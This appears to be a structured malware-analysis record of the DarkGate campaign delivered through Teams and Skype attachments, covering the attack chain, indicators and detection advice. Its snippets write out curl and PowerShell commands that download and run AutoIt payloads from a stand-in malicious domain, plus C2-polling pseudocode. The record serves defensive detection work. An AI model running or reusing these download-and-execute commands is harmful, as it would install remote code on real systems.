package_info.package_manager: N/A (delivered via messaging platforms, not a package manager)
package_info.why_malicious: DarkGate is a Windows-based malware campaign distributed via social engineering on Teams and Skype, leveraging malicious scripts and AutoIt to deliver a payload that enables remote access, file encryption, credential theft, and cryptocurrency mining. The entire delivery chain is malicious, as it is designed to compromise endpoints, exfiltrate sensitive data, and perform unauthorized actions on victim systems.

execution_context.file_location: VBA script attached to Skype message (masquerading as PDF)

malicious_snippets.code_snippet: curl -o autoit.exe http://malicious-domain.com/autoit.exe && curl -o payload.au3 http://malicious-domain.com/payload.au3 && start autoit.exe payload.au3
malicious_snippets.code_behavior: Upon user-execution, the VBA script invokes a shell command to download a legitimate AutoIt binary and a malicious AutoIt script from an external domain, then executes the script using AutoIt, resulting in the activation of the DarkGate payload.

malice_analysis.why_suspicious: The script downloads executable files and scripts from an untrusted, external domain and immediately executes them, which is a hallmark of malware delivery and initial access techniques.
malice_analysis.violated_expectations: Legitimate VBA or VBS scripts attached to business messages should never download and execute binaries from the internet, especially from non-corporate domains.
malice_analysis.similar_legitimate_use: Automated software updaters may download and execute binaries, but only from trusted, verified sources and with user consent.
key_indicators: Use of curl to download executables from non-corporate or suspicious domains
Attachment masquerading as a PDF to deceive users
Presence of VBA or VBS scripts in messaging attachments

malicious_snippets.code_snippet: powershell -Command "Invoke-WebRequest -Uri http://malicious-domain.com/autoit.exe -OutFile autoit.exe; Invoke-WebRequest -Uri http://malicious-domain.com/payload.au3 -OutFile payload.au3; Start-Process autoit.exe payload.au3"
malicious_snippets.code_behavior: When the LNK file is executed by the user, it launches a PowerShell command that downloads both a legitimate AutoIt binary and a malicious AutoIt script from an external server, then executes the script with AutoIt, resulting in the deployment of the DarkGate payload.

malice_analysis.why_suspicious: LNK files that execute PowerShell to download and run binaries from external domains are a well-known malware delivery vector and are rarely used in legitimate business workflows.
malice_analysis.violated_expectations: LNK files in business communications should not trigger PowerShell downloads or execute remote code, especially from untrusted sources.
malice_analysis.similar_legitimate_use: IT automation scripts may use similar PowerShell commands, but not via unsolicited LNK files from external senders and not in user-facing messaging platforms.
key_indicators: PowerShell command chain for downloading and executing binaries
LNK file as the initial execution vector
Use of external, non-corporate domains for payload delivery
Presence of PowerShell in the command line of LNK file targets

malicious_snippets.code_snippet:
; AutoIt script pseudocode
Run('cmd.exe /c whoami > C:\temp\user.txt')
InetRead('http://malicious-domain.com/command')
; Steal credentials, mine crypto, encrypt files, etc.
malicious_snippets.code_behavior: At runtime, the malicious AutoIt script executes system commands to collect system information, communicates with a remote command-and-control server to retrieve further instructions, and performs malicious actions such as credential theft, file encryption, and cryptocurrency mining, resulting in full system compromise.

malice_analysis.why_suspicious: The script performs unauthorized system access, retrieves remote commands from a C2 server, and executes post-exploitation activities including credential theft, file encryption, and crypto mining, all of which are clear indicators of malware.
malice_analysis.violated_expectations: Legitimate AutoIt scripts should not connect to external command-and-control servers, exfiltrate system information, or perform credential theft and file encryption.
malice_analysis.similar_legitimate_use: Remote management tools may use AutoIt for automation, but not for malicious activities such as credential theft, unauthorized encryption, or covert network communication.
key_indicators: AutoIt script containing obfuscated or malicious logic
Outbound network connections to remote C2 servers
Execution of system commands for information gathering
Evidence of credential theft, file encryption, or crypto mining in script logic

attack_chain.action: Victim receives a malicious attachment (VBA script or LNK file) via Skype or Teams from a trusted or external sender.
attack_chain.leads_to: User executes the attachment, triggering the download of additional payloads.

attack_chain.action: Malicious script downloads a legitimate AutoIt binary and a malicious AutoIt script from an external server.
attack_chain.leads_to: Downloaded files are executed on the victim's system.

attack_chain.action: Malicious AutoIt script executes, performing credential theft, file encryption, crypto mining, and remote access.

behavioral_signatures: Messaging attachments (VBA, VBS, LNK) that download and execute binaries using curl or PowerShell
Execution of AutoIt binaries with external script payloads in user directories
AutoIt scripts making outbound network connections to untrusted domains
PowerShell or curl used to fetch executables from non-corporate or suspicious domains
Unexpected process chains: messaging client -> script/LNK -> PowerShell/curl -> AutoIt
file_indicators: Unexpected .LNK or .VBS attachments in Teams/Skype messages
Downloaded autoit.exe present in user temp or downloads directory
payload.au3 or similarly named AutoIt script files in user-accessible locations
Presence of masquerading attachments (e.g., .vbs or .lnk files named as PDFs)
network_indicators: Outbound HTTP/S requests to unknown or suspicious domains (e.g., malicious-domain.com)
AutoIt scripts initiating network connections to external IPs/domains
C2 communication patterns originating from AutoIt or PowerShell processes
Unusual network activity from user workstations following execution of messaging attachments
detection_knowledge.how_to_detect: Monitor for messaging attachments containing VBA, VBS, or LNK files that invoke PowerShell or curl to download executables. Flag execution of AutoIt binaries with non-standard script arguments, especially when sourced from user directories. Detect outbound network connections from AutoIt or PowerShell processes to untrusted or non-corporate domains. Alert on the presence of unexpected AutoIt scripts or binaries in user-accessible locations, and correlate with recent execution of suspicious messaging attachments.
